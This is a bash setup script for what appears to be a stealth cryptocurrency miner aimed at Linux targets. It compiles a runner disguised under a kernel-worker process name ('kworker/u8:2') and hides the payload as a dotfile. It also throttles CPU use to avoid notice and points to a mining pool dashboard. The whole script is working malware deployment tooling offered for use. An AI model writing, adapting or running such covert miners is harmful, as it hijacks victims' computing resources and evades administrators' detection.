#!/bin/bash
# stealth-power2b setup (Linux target)
# usage: bash setup.sh [--threads N] [--cpu PCT] [--title NAME]
set -u
THREADS=4; CPU_PCT=60; TITLE="kworker/u8:2"
while [ $# -gt 0 ]; do case "$1" in
  --threads) THREADS="$2"; shift 2;;
  --cpu) CPU_PCT="$2"; shift 2;;
  --title) TITLE="$2"; shift 2;;
  *) shift;;
esac; done
D="$(cd "$(dirname "$0")" && pwd)"; cd "$D"
command -v cc >/dev/null || { echo "need cc/gcc"; exit 1; }
[ -f payload.bin ] || { echo "payload.bin missing"; exit 1; }
# bake title/threads/cpu into runner at build time
sed -e "s/kworker\/u8:2/$TITLE/" runner.c > .runner_build.c
sed -i -e "s/static int THREADS = 4;/static int THREADS = $THREADS;/" \
       -e "s/static int CPU_PCT = 60;/static int CPU_PCT = $CPU_PCT;/" .runner_build.c
cc -O2 -s -o "$TITLE" .runner_build.c && rm -f .runner_build.c
chmod +x "$TITLE" payload.bin
mv payload.bin .payload
# verify hasher before deploy
./.payload test 2>&1 | tail -n 3
echo "built: $D/$TITLE + $D/.payload"
echo "run: ./\"$TITLE\"  (daemonizes, check jobs via pool dashboard)"
echo "stop: pkill -f \"$TITLE\"; pkill -f .payload"
